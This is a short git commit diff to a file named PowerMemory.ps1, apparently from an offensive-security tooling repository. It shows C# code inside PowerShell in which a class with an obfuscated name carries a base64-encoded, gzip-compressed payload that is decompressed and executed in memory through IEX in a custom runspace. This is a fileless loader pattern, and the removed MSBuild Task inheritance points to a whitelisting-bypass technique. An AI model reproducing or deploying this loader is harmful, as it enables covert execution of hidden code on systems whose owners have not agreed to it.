aecf543e9819fc955c917785e4c65a25e8f7700e
plackyhacker <42491100+plackyhacker@users.noreply.github.com>
2021-06-03 08:42:08 +0100

    Update PowerMemory.ps1

--- PowerMemory.ps1
+++ PowerMemory.ps1
@@ -11,7 +11,7 @@ using System.Management.Automation.Runspaces;
 using System.Text;
 namespace test
 {
-  public class QWEridxnaPO$id :  Task, ITask {
+  public class QWEridxnaPO$id {
     public override bool Execute() {
       string pok = "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAAAAAA/21R3WvCMBB/z19xBB8stEW2N0XQ6WDChLE69iA+ZM2thrVJSK6iDP/3pa3r3Ng93Fd+l999DJSEKRRIiRNamooNciMxpGac1V7pArKTJ6wmv6J0g0f6k3quNakK05UmdMZm6A4qRz9hTIsKvRU5AqEn9skgiK3fSpVDXgrv4cWju70ZKNk+dYBGtsuyXFXWOBryusWksix5DIu9cBnS9GLTeU0m2vV1l889CQom9IpOg9IEa/ReFHhnjsPQ5xM52L9qGUNGrhmFArQPcmFJGR23hab1fRTG+Z/kYMIm10LpYdQjfgZp5Ir7Qh6NYuAPWJaGXzmjQPJdc2adPjM+Y2wuZbI5WYRWL/FdadW0Bd3RkkehizpQwCILe7HAVvpgPjC5P1oXyBsk3zY3SPuF78bjrmn+BcP147cKAgAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();";
       Runspace runspace = RunspaceFactory.CreateRunspace();
